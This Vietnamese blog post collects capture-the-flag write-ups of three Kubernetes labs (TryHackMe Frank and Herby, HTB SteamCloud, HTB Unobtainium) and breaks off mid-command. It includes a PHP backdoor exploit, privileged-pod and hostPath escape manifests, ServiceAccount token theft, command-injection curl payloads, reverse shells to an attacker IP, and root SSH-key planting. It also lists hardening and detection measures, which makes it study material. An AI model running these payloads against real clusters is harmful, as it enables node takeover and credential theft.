---
title: "Tu?n 2 - Lab THM HTB v? Kubernetes"
date: 2026-05-24 00:00:00 +0700
categories: ["Security Research"]
tags: ["Kubernetes", "Security", "HTB", "THM"]
---


### Lab THM Frank and Herby try again.....

![](/assets/images/posts/Pasted%20image%2020260522231336.png)

Bu?c d?u ti�n th� qu�t Nmap d? t�m c�c attack surface

![](/assets/images/posts/Pasted%20image%2020260522232951.png)


K?t qu? qu�t Nmap  cho th?y m?c ti�u (IP `10.49.173.204`) dang m? kh� nhi?u c?ng d?ch v? l?. ��y c� v? l� m?t c?m **Kubernetes** ho?c m?t m�i tru?ng container.

Du?i d�y l� ph�n t�ch c�c c?ng dang m?:

C�c c?ng d�ng ch� �

- **C?ng 22 (ssh)**: C?ng qu?n l� t? xa qua d�ng l?nh.
- **C?ng 10250, 10255, 10257, 10259**: ��y l� c�c c?ng d?c trung c?a **Kubernetes Kubelet API**.
    - `10250`: Kubelet API (thu?ng y�u c?u x�c th?c).
    - `10255`: Read-only Kubelet API (thu?ng kh�ng y�u c?u x�c th?c, c� th? l? th�ng tin nh?y c?m).
    - c?ng�`10257` tuong ?ng v?i kube-controller-manager
    - c?ng�`10259` tuong ?ng v?i kube-scheduler tr�n c�c node m?t ph?ng di?u khi?n Kubernetes.
- **C?ng 30679**: ��y c� th? l� m?t **NodePort** (d?ch v? du?c ?ng d?ng b�n trong Kubernetes dua ra ngo�i).

![](/assets/images/posts/Pasted%20image%2020260522233352.png)


C� 1 web server port 30679 du?c expose n�n tui c� th? truy c?p d? xem th?

![](/assets/images/posts/Pasted%20image%2020260522233502.png)

Curl t?i api d� d? d?c th� th?y

![](/assets/images/posts/Pasted%20image%2020260522234813.png)


![](/assets/images/posts/Pasted%20image%2020260522234914.png)


**Ph�n t�ch th�ng tin JSON thu du?c�`/pods`, ta c� th? th?y c� 4 pod dang ch?y tr�n m�y:

```
calico-node             
calico-kube-controllers 
coredns                 
php-deploy          
```

![](/assets/images/posts/Pasted%20image%2020260522235131.png)


Sau khi wappalyzer th� th?y web server s? d?ng php version 8.1.0 , th� ? d�y tui cung d� do�n du?c m�nh c?n RCE v�o server n�y , v� sau d� m�nh l�n git v� t�m PoC n�y d? c� th? ch?y m� khai th�c
https://github.com/flast101/php-8.1.0-dev-backdoor-rce



![](/assets/images/posts/Pasted%20image%2020260522235945.png)

D?ng m�y l?ng nghe th� d�nh du?c reverse shell th�nh c�ng

![](/assets/images/posts/Pasted%20image%2020260522235955.png)


![](/assets/images/posts/Pasted%20image%2020260523000134.png)


![](/assets/images/posts/Pasted%20image%2020260523000327.png)


Chuy?n sang s? d?ng pwncat d? c� th? t?i kubectl do ko d�ng curl ho?c wget du?c 

Nhung  sau 1 h?i c�i pwncat-cs th� thu vi?n c� kh? nhi?u l?i v� tui m?t cung v�i ti?ng nhung cung ko th? fix du?c. N�n sau m?t h?i tham  kh?o WU c?a c�c ph�p su nu?c ngo�i  th� tui nh?n ra v?n c�n c�ch n �y d? c� th? t?i kubectl l�n

�?m b?o b?n dang d?ng ? thu m?c ch?a file `kubectl` tr�n m�y Kali v� b?t server l�n:

Bash

```
python3 -m http.server 80
```


T?i c?a s? shell c?a container, b?n ch?y l?nh PHP n�y d? t?i file tr?c ti?p (nh? thay `192.168.246.92` b?ng IP VPN `tun0` hi?n t?i c?a b?n):

Bash

```
php -r 'copy("http://192.168.246.92/kubectl", "/tmp/kubectl");'
```

_(B?n nh�n sang terminal m�y Kali, n?u th?y d�ng log `192.168.x.x - - [2026...] "GET /kubectl HTTP/1.1" 200` hi?n ra l� file d� du?c t?i sang th�nh c�ng mu?t m�)._



B�y gi? c?p quy?n th?c thi cho file v� ki?m tra xem Service Account trong Pod n�y c� th? d?c du?c nh?ng g� trong c?m Kubernetes:

Bash

```
chmod +x /tmp/kubectl

# Ki?m tra danh s�ch Pod trong namespace hi?n t?i
/tmp/kubectl get pods

# Ki?m tra xem Service Account c?a b?n c� nh?ng quy?n g� (R?t quan tr?ng d? bi?t du?ng leo thang)
/tmp/kubectl auth can-i --list
```

```
root@php-deploy-6d998f68b9-pj8v5:/tmp# ./kubectl auth can-i --list
./kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
root@php-deploy-6d998f68b9-pj8v5:/tmp# 

```

�? truy c?p v�o m�y ch?, ch�ng ta s? ch?y l?nh sau, l?nh n�y c� th? t�m th?y tr�n�[HackTricks](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/abusing-roles-clusterroles-in-kubernetes#pod-create-and-escape)�:

```
kubectl run r00t --restart=Never -it --image something --rm --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"vulhub/php:8.1-backdoor","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

H�y c�ng ph�n t�ch d? hi?u r� di?u g� dang x?y ra:

- `kubectl`- V�ng, r� r�ng l� n� l�m g�: tuong t�c v?i c?m Kubernetes.
- `run r00t`- Kh?i t?o m?t pod c� t�n`r00t`
- `--restart=Never`- N?u thi?t b? d?ng ho?t d?ng, d?ng kh?i d?ng l?i n�.
- `-it`- C?p ph�t m?t TTY cho container trong pod v� k?t n?i�`stdin`v?i n� (�_nghia l�_�cho ph�p ch�ng ta tuong t�c v?i container)
- `--image something`- ? d�y ch�ng ta c?n c� h�nh ?nh cho pod, tuy nhi�n v� n� s? b? ghi d� n�n n� c� th? l� b?t k? h�nh ?nh n�o.
- `--rm`- X�a pod sau khi n� tho�t
- `--overrides`- S? d?ng JSON n?i tuy?n d? ghi d� l�n d?i tu?ng du?c t?o t? d?ng

B�y gi? ch�ng ta s? xem x�t c�c gi� tr? m� ch�ng ta dang ghi d�.

```
{
    "spec": {
        "hostPID": true,
        "containers": [{
            "name": "1",
            "image": "vulhub/php:8.1-backdoor",
            "command": ["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],
            "stdin": true,
            "tty":true,
            "imagePullPolicy":"IfNotPresent",
            "securityContext": {
                "privileged": true
            }
        }]
    }
}
```

Sau khi ch?nh s?a c�c gi� tr? ghi d�, ch�ng ta c� th? th?y r?ng pod s? chia s? kh�ng gian t�n ID ti?n tr�nh m�y ch? (�`hostPID`), s? c� m?t container s? d?ng h�nh ?nh m� ch�ng ta d� c� trong node c?a m�nh (v� ch�ng ta kh�ng c� quy?n truy c?p internet - ch�ng ta ph?i th?c hi?n thay d?i n�y) v� s? ch?y ? ch? d? d?c quy?n.

L?nh s? du?c th?c thi khi container kh?i d?ng l�`nsenter`l?nh cho ph�p ch�ng ta ch?y m?t chuong tr�nh trong m?t namespace kh�c. C? n�y�`--mount=/proc/1/ns/mnt`cho bi?t�`nsenter`s? v�o namespace du?c g?n k?t (hay c�n g?i l� h? th?ng t?p tin) c?a ti?n tr�nh c� PID 1, t?c l�`init`ti?n tr�nh d�, c� nghia l� ch�ng ta s? th?c thi�`/bin/bash`trong h? th?ng t?p tin c?a m�y ch? (v� ch�ng ta dang tham chi?u d?n h? th?ng t?p tin�`init`c?a m�y ch? ch? kh�ng ph?i c?a container, do�`hostPID`gi� tr? c?a c?), n�i c�ch kh�c, ch�ng ta dang ? b�n trong m�y ch?.

Sau d�, ch�ng ta l?i du?c dua v�o m?t shell c� quy?n root, nhung l?n n�y l� b�n trong m�y ch?, v� v?y t?t c? nh?ng g� ch�ng ta c?n l�m l� l?y c�c c? t?�`/home/herby/user.txt`v�`/root/root.txt`.


ho?c b?n c� th? t?o 1 bad pods b?ng c�ch n�y 

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

```
apiVersion: v1
kind: Pod
metadata:
  name: pwned
  labels:
    app: pwn
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwned
    image: docker.io/vulhub/php:8.1-backdoor
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /

```


https://qiita.com/rikum0730/items/813d8fc29b8788387cb1
https://dmaxter.pt/writeups/thm-frank-and-herby-try-again/


## HTB SteamCloud - Kubernetes/Kubelet Misconfiguration

![](/assets/images/posts/Pasted%20image%2020260524221954.png)

> **Ngu?n tham kh?o:** https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html  
> **M?c ti�u h?c:** hi?u chu?i t?n c�ng t? Kubelet API exposed ? chi?m pod ? l?y ServiceAccount token ? l?m d?ng quy?n t?o pod d? mount filesystem c?a host.

### 1. T?ng quan b�i lab

SteamCloud l� m?t m�y HTB m?c Easy nhung r?t h?p d? h?c Kubernetes security v� lu?ng khai th�c kh� s?ch:

```text
Recon port K8s
? Kubelet API exposed
? Exec v�o pod nginx
? L?y ServiceAccount token
? Authenticate v�o Kubernetes API
? Ki?m tra RBAC
? T?o pod mount root filesystem c?a host
? �?c root.txt / l?y root shell host
```

�i?m quan tr?ng c?a b�i n�y kh�ng n?m ? exploit CVE, m� n?m ? **misconfiguration**:

- Kubelet API port `10250` c� th? tuong t�c t? b�n ngo�i.
- Attacker c� th? `exec` command v�o pod dang ch?y.
- ServiceAccount trong pod c� quy?n `get`, `list`, `create pods`.
- Quy?n `create pods` d? nguy hi?m d? t?o pod m?i c� `hostPath` mount `/` c?a node.

### 2. Recon

Scan full port:

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.133
```

C�c port d�ng ch� �:

```text
22/tcp     ssh
2379/tcp   etcd-client
2380/tcp   etcd-server
8443/tcp   Kubernetes API server / minikube API
10249/tcp  kube-proxy metrics
10250/tcp  Kubelet API
10256/tcp  kube-proxy healthz
```

Scan service/version:

```bash
nmap -p 22,2379,2380,8443,10249,10250,10256 -sCV -oA scans/nmap-tcpscripts 10.10.11.133
```

Nh�n certificate ? port `8443` th?y nhi?u d?u hi?u d�y l� m�i tru?ng **minikube/Kubernetes**:

```text
commonName=minikube
DNS:kubernetes.default.svc.cluster.local
DNS:kubernetes.default
IP Address:10.96.0.1
IP Address:127.0.0.1
```

K?t lu?n nhanh:

- `8443`: Kubernetes API Server, c?n credential.
- `10250`: Kubelet API, c� kh? nang b? c?u h�nh l?ng.
- `2379/2380`: etcd, nhung trong b�i n�y kh�ng ph?i du?ng khai th�c ch�nh.

### 3. Th? Kubernetes API Server

G?i API b?ng `kubectl` th� b? y�u c?u x�c th?c:

```bash
kubectl --server https://10.10.11.133:8443 get pods
kubectl --server https://10.10.11.133:8443 get namespaces
kubectl --server https://10.10.11.133:8443 cluster-info
```

K?t qu? l� `kubectl` h?i username/password ho?c tr? v? `Forbidden`, nghia l� chua c� credential d? di qua API Server.

### 4. Khai th�c Kubelet API

D�ng `kubeletctl` d? tuong t�c v?i Kubelet port `10250`:

```bash
kubeletctl pods -s 10.10.11.133
```

Danh s�ch pod d�ng ch� �:

```text
storage-provisioner                 kube-system
coredns-78fcd69978-7dhjv            kube-system
nginx                               default
etcd-steamcloud                     kube-system
kube-apiserver-steamcloud           kube-system
kube-controller-manager-steamcloud  kube-system
kube-scheduler-steamcloud           kube-system
kube-proxy-562gf                    kube-system
```

Pod `nginx` n?m trong namespace `default`, d�y l� m?c ti�u d? th? tru?c v� kh�ng thu?c nh�m control plane.

C� th? format danh s�ch pod t? JSON:

```bash
kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
```

### 5. Exec v�o pod nginx

Test command execution:

```bash
kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
```

K?t qu?:

```text
uid=0(root) gid=0(root) groups=0(root)
```

? d�y m�nh l� `root` **trong container nginx**, chua ph?i root c?a host.

�?c user flag:

```bash
kubeletctl -s 10.10.11.133 exec "ls /root" -p nginx -c nginx
kubeletctl -s 10.10.11.133 exec "cat /root/user.txt" -p nginx -c nginx
```

C� th? l?y interactive shell tr?c ti?p:

```bash
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
```

### 6. L?y ServiceAccount token trong pod

Trong Kubernetes, m?i pod thu?ng du?c mount ServiceAccount token d? n�i chuy?n v?i API Server. Ki?m tra trong container:

```bash
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
```

C�c file quan tr?ng:

```text
ca.crt
namespace
token
```

� nghia:

- `ca.crt`: CA certificate d? trust Kubernetes API Server.
- `namespace`: namespace hi?n t?i c?a pod.
- `token`: bearer token c?a ServiceAccount g?n v?i pod.

Luu CA cert v� token v? m�y attacker:

```bash
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
```

Ho?c dua token v�o bi?n m�i tru?ng:

```bash
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```

### 7. Authenticate v�o Kubernetes API b?ng token

D�ng `ca.crt` v� token v?a l?y d? g?i API Server:

```bash
kubectl --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token \
  get pods
```

N?u th�nh c�ng s? th?y pod `nginx`:

```text
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          ...
```

Ki?m tra quy?n c?a ServiceAccount:

```bash
kubectl auth can-i --list \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

D�ng quan tr?ng:

```text
pods    []    []    [get create list]
```

��y l� pivot point c?a b�i: ServiceAccount kh�ng ph?i cluster-admin, nhung c� quy?n **create pods** trong namespace `default`. V?i quy?n n�y, attacker c� th? t?o pod m?i mount filesystem c?a host.

### 8. Xem c?u h�nh pod nginx

Dump YAML c?a pod hi?n t?i:

```bash
kubectl get pod nginx -o yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Th�ng tin c?n l?y:

```yaml
namespace: default
image: nginx:1.14.2
```

Ta d�ng l?i image `nginx:1.14.2` v� image n�y d� c� s?n tr�n node, tr�nh ph? thu?c internet/image pull.

### 9. T?o pod mount `/` c?a host

T?o file `evil-pod.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  containers:
  - name: attacker-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Gi?i th�ch:

- `hostPath.path: /`: mount to�n b? root filesystem c?a node v�o pod.
- `mountPath: /mnt`: trong container, host filesystem xu?t hi?n t?i `/mnt`.
- `hostNetwork: true`: pod d�ng network namespace c?a host.
- `image: nginx:1.14.2`: d�ng image d� c� s?n tr�n node.

Apply pod:

```bash
kubectl apply -f evil-pod.yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Ki?m tra:

```bash
kubectl get pods \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

### 10. �?c filesystem c?a host

Exec v�o pod m?i b?ng Kubelet:

```bash
kubeletctl exec "id" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

Li?t k� root filesystem c?a host:

```bash
kubeletctl exec "ls /mnt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

�?c root flag:

```bash
kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

L�c n�y `/mnt` ch�nh l� `/` c?a node th?t, v� v?y `/mnt/root/root.txt` tuong ?ng v?i `/root/root.txt` tr�n host.

### 11. L?y root shell tr�n host

C� th? t?o pod th? hai ch?y reverse shell ngay khi container start:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-shell
  namespace: default
spec:
  containers:
  - name: attacker-shell
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Tr�n m�y attacker b?t listener:

```bash
nc -lnvp 443
```

Apply pod:

```bash
kubectl apply -f attacker-shell.yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Sau khi shell callback v?, c� th? ghi SSH public key v�o host root:

```bash
mkdir -p /mnt/root/.ssh
cd /mnt/root/.ssh
echo "ssh-ed25519 <PUBLIC_KEY> attacker@kali" > authorized_keys
```

R?i SSH v�o host:

```bash
ssh -i id_ed25519 root@10.10.11.133
```

### 12. V� sao quy?n `create pods` nguy hi?m?

Trong Kubernetes, quy?n `create pods` c� th? tr? th�nh quy?n leo thang r?t m?nh n?u cluster kh�ng ch?n c�c c?u h�nh nguy hi?m. Attacker c� th? t?o pod v?i:

- `hostPath` mount thu m?c nh?y c?m c?a node.
- `hostNetwork: true` d? d�ng network c?a host.
- `hostPID: true` d? nh�n process c?a host.
- `privileged: true` d? tang kh? nang escape.
- ServiceAccount kh�c n?u c� quy?n g�n ho?c d�ng SA m?nh hon.

Trong SteamCloud, ch? c?n `hostPath: /` l� d? d? d?c to�n b? filesystem c?a node.

### 13. Mapping v?i d? t�i VDT

B�i n�y kh?p t?t v?i hu?ng **Kubernetes privilege escalation do misconfiguration**:

| Giai do?n | K? thu?t | � nghia trong d? t�i |
|---|---|---|
| Recon | Scan port K8s | Nh?n di?n API Server, Kubelet, etcd |
| Initial Access | Kubelet anonymous/weak access | Th?c thi l?nh trong pod qua Kubelet |
| Credential Access | ServiceAccount token | L?y credential m?c d?nh du?c mount trong pod |
| Privilege Discovery | `kubectl auth can-i --list` | Ki?m tra quy?n RBAC hi?n c� |
| Privilege Escalation | `create pods` + `hostPath` | T?o pod d?c h?i mount filesystem host |
| Impact | �?c `/root/root.txt`, SSH root | Ki?m so�t node/host |

### 14. Detection / Hardening r�t ra

C�c di?m ph�ng th? n�n dua v�o ph?n demo ho?c b�o c�o:

- Kh�ng expose Kubelet API ra ngo�i network kh�ng tin c?y.
- T?t ho?c h?n ch? anonymous access v�o Kubelet.
- B?t Kubelet authentication/authorization d�ng c�ch.
- RBAC theo nguy�n t?c least privilege, kh�ng c?p `create pods` b?a b�i.
- D�ng Pod Security Admission/Kyverno/Gatekeeper d? ch?n:
  - `hostPath` mount `/`
  - `hostNetwork: true`
  - `hostPID: true`
  - `privileged: true`
- T?t `automountServiceAccountToken` n?u pod kh�ng c?n g?i Kubernetes API:

```yaml
automountServiceAccountToken: false
```

- Gi�m s�t h�nh vi runtime b?ng Falco/Tetragon. C�c event d�ng ch� �:
  - Pod m?i c� `hostPath` mount `/`.
  - Pod b?t `hostNetwork` ho?c `privileged`.
  - Truy c?p file ServiceAccount token.
  - Exec b?t thu?ng v�o container qua Kubelet.

### 15. Takeaway

SteamCloud cho th?y m?t lesson r?t quan tr?ng: **kh�ng c?n CVE v?n c� th? chi?m node Kubernetes n?u Kubelet/RBAC/Pod Security b? c?u h�nh sai**. M?t ServiceAccount tu?ng nhu ch? c� quy?n `create pods` trong namespace `default` v?n c� th? b? l?m d?ng d? t?o pod mount filesystem c?a host, t? d� d?c flag ho?c c�i SSH key d? l?y root shell.


## HTB Unobtainium - RBAC Abuse + Secret Access + Malicious Pod



> **Ngu?n tham kh?o:** https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html  
> **�? kh�:** Hard  


### 1. T?ng quan chain khai th�c

Unobtainium l� b�i Kubernetes kh� hon SteamCloud v� kh�ng don gi?n l� c� ngay quy?n t?o pod. Lu?ng ch�nh:

```text
Web/Electron app reverse
? LFI / l?y source + credential
? Prototype Pollution
? Command Injection
? RCE v�o container webapp
? L?y ServiceAccount token default
? Enumerate RBAC
? T�m namespace dev v� pod devnode
? RCE ti?p v�o devnode container
? L?y dev ServiceAccount token
? dev token c� quy?n get/list secrets trong kube-system
? �?c c-admin service account token
? c-admin c� quy?n *.* [*]
? T?o malicious pod mount hostPath /
? �?c root.txt / ki?m so�t host filesystem
```

�i?m c?n h?c cho d? t�i VDT:

- **ServiceAccount token trong pod l� credential th?t** d? g?i Kubernetes API.
- **RBAC theo namespace c� th? t?o du?ng pivot**: token A kh�ng m?nh ? namespace `default`, nhung l?i c� quy?n h?u �ch ? namespace `dev`.
- **Quy?n `get/list secrets` trong `kube-system` c?c k? nguy hi?m**, v� c� th? d?c token c?a ServiceAccount m?nh hon.
- Sau khi c� token admin, k? thu?t k?t th�c gi?ng SteamCloud: t?o pod mount filesystem host.

### 2. Recon Kubernetes

Nmap th?y nhi?u port quen thu?c c?a Kubernetes/minikube:

```text
22/tcp     ssh
80/tcp     web
2379/tcp   etcd-client
2380/tcp   etcd-server
8443/tcp   Kubernetes API Server
10250/tcp  Kubelet API
10256/tcp  kube-proxy healthz
31337/tcp  Node.js Express API
```

Port `8443` tr? JSON ki?u Kubernetes API v� b�o `system:anonymous` b? forbidden, x�c nh?n d�y l� API Server:

```text
forbidden: User "system:anonymous" cannot get path "/"
```

### 3. Ph?n RCE ban d?u - ghi so

B�i g?c c� ph?n reverse Electron package d? l?y source/credential. Sau d� t�m du?c API Node.js c� logic upload b? ?nh hu?ng b?i prototype pollution.

� tu?ng ng?n:

1. D�ng credential h?p l? d? g?i message.
2. Prototype pollution set `canUpload: true`.
3. Route `/upload` g?i command x? l� file nhung n?i `filename` kh�ng an to�n.
4. Inject command qua `filename` d? c� RCE.

Payload b?t quy?n upload:

```bash
curl -X PUT http://10.10.10.235:31337/ \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"test":"x","__proto__":{"canUpload":true}}}'
```

Payload command injection d? reverse shell:

```bash
curl -X POST http://10.10.10.235:31337/upload \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"x; bash -c \"bash >& /dev/tcp/<ATTACKER_IP>/443 0>&1\""}'
```

Nh?n shell trong pod webapp:

```text
root@webapp-deployment-...:/usr/src/app# id
uid=0(root) gid=0(root) groups=0(root)
```

Luu �: `root` ? d�y v?n l� root **trong container**, chua ph?i root c?a node.

### 4. L?y token trong webapp container

Trong pod, ki?m tra ServiceAccount token:

```bash
ls /run/secrets/kubernetes.io/serviceaccount/
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /run/secrets/kubernetes.io/serviceaccount/namespace
```

C�c file thu?ng g?p:

```text
ca.crt
namespace
token
```

Luu token ra m�y attacker, v� d?:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token > default-token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
```

D�ng token g?i API Server:

```bash
kubectl --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  get pods --all-namespaces
```

Ban d?u b? forbidden v?i pods to�n cluster, nhung ph?n h?i n�y v?n ch?ng minh token d�ng du?c v?i API Server.

### 5. Enumerate RBAC v?i token default

Ki?m tra quy?n trong namespace hi?n t?i:

```bash
kubectl auth can-i --list \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Token default c� quy?n d�ng ch� �:

```text
namespaces    [get list]
```

List namespace:

```bash
kubectl get namespaces \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

K?t qu? c� namespace `dev`:

```text
default
_dev_
kube-node-lease
kube-public
kube-system
```

Ki?m tra quy?n theo namespace:

```bash
kubectl auth can-i --list -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Trong namespace `dev`, token default c� th�m quy?n:

```text
namespaces    [get list]
pods          [get list]
```

��y l� pivot d?u ti�n: token kh�ng t?o du?c pod, kh�ng d?c secret, nhung c� th? **li?t k� pod ? namespace dev**.

### 6. T�m pod devnode trong namespace dev

List pod trong namespace `dev`:

```bash
kubectl get pods -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

K?t qu? c� c�c pod d?ng:

```text
devnode-deployment-cd86fb5c-6ms8d
devnode-deployment-cd86fb5c-mvrfz
devnode-deployment-cd86fb5c-qlxww
```

Describe pod d? l?y IP/container/image:

```bash
kubectl describe pod devnode-deployment-cd86fb5c-qlxww -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Th�ng tin d�ng ch� �:

```text
Namespace: dev
IP: 172.17.0.4
Image: localhost:5000/node_server
Port: 3000/TCP
Mounts: /var/run/secrets/kubernetes.io/serviceaccount
```

T? shell webapp container c� th? reach pod devnode qua IP n?i b?. Scan/ping th?y port `3000` m?.

### 7. RCE sang devnode container

?ng d?ng ? devnode ch?y c�ng code/vuln Node.js n�n c� th? d�ng l?i chain prototype pollution + command injection.

T? webapp container, b?t `canUpload` tr�n devnode:

```bash
curl -X PUT http://172.17.0.3:3000/ \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"test":"x","__proto__":{"canUpload":true}}}'
```

Inject reverse shell:

```bash
curl -X POST http://172.17.0.3:3000/upload \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"x; bash -c \"bash >& /dev/tcp/<ATTACKER_IP>/443 0>&1\""}'
```

Nh?n shell m?i:

```text
root@devnode-deployment-cd86fb5c-6ms8d:/# id
uid=0(root) gid=0(root) groups=0(root)
```

Ki?m tra namespace c?a pod m?i:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/namespace
```

K?t qu?:

```text
dev
```

### 8. L?y dev token v� ki?m tra RBAC

L?y token trong devnode:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token > dev-token
```

Ki?m tra quy?n token n�y:

```bash
kubectl auth can-i --list \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

? namespace `dev` kh�ng c� g� qu� m?nh. Nhung khi ki?m tra namespace `kube-system`:

```bash
kubectl auth can-i --list -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Ph�t hi?n quy?n c?c k? quan tr?ng:

```text
secrets    [get list]
```

��y l� l?i RBAC ch�nh c?a b�i: ServiceAccount trong namespace `dev` l?i c� quy?n d?c secrets trong `kube-system`.

### 9. �?c ServiceAccount token m?nh hon trong kube-system

List secrets trong `kube-system`:

```bash
kubectl get secrets -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Trong danh s�ch c� secret d�ng ch� �:

```text
c-admin-token-tfmp2    kubernetes.io/service-account-token
```

Describe secret d? l?y token:

```bash
kubectl describe secret c-admin-token-tfmp2 -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Secret n�y thu?c ServiceAccount:

```text
kubernetes.io/service-account.name: c-admin
```

Luu token admin ra file:

```bash
# copy ph?n token trong output v�o file
nano cadmin-token
```

Ho?c d�ng jsonpath n?u API tr? d? data:

```bash
kubectl get secret c-admin-token-tfmp2 -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  -o jsonpath='{.data.token}' | base64 -d > cadmin-token
```

### 10. X�c nh?n quy?n admin

Ki?m tra quy?n c?a `cadmin-token`:

```bash
kubectl auth can-i --list \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

K?t qu? quan tr?ng:

```text
*.*    []    []    [*]
[*]    []    [*]
```

Nghia l� token n�y c� quy?n full admin tr�n cluster.

C� th? list pods to�n cluster:

```bash
kubectl get pods --all-namespaces \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

### 11. T�m image local d? t?o malicious pod

V� box kh�ng c� internet, kh�ng n�n d�ng image t? Docker Hub. T�m image dang c� s?n trong cluster:

```bash
kubectl get pods --all-namespaces \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Dump YAML t?ng pod d? t�m image:

```bash
kubectl get pod <pod-name> -o yaml -n <namespace> \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt | grep 'image:'
```

C�c image c� s?n:

```text
localhost:5000/dev-alpine
localhost:5000/node_server
```

Ch?n `localhost:5000/dev-alpine` v� nh? v� c� shell.

### 12. T?o malicious pod mount filesystem host

T?o `root.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: kube-system
spec:
  containers:
  - name: evil
    image: localhost:5000/dev-alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Gi?i th�ch:

- `namespace: kube-system`: d� c� admin n�n c� th? t?o pod ? namespace nh?y c?m.
- `image: localhost:5000/dev-alpine`: d�ng image local c� s?n.
- `hostPath.path: /`: mount root filesystem c?a node.
- `mountPath: /mnt`: trong container, host filesystem n?m ? `/mnt`.
- `sleep 300000`: gi? container s?ng d? c�n `kubectl exec` v�o.
- `hostNetwork: true`: d�ng network namespace c?a host.

Apply pod:

```bash
kubectl apply -f root.yaml \
